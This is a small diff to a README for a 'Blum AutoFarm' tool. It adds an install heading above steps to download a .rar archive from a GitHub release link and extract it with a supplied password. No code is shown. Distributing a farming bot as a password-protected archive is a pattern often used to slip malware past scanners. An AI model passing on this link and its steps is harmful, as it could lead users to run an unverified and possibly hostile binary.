@@ -1,4 +1,5 @@
 # Blum AutoFarm
+## How install: 
 
 - 📦 [Download](https://github.com/YbizWantzModz/BLUM-farm-PC/releases/download/Download/Blum_auto.rar)
 - 1️⃣ Extract the archive (pass:12DSAs)
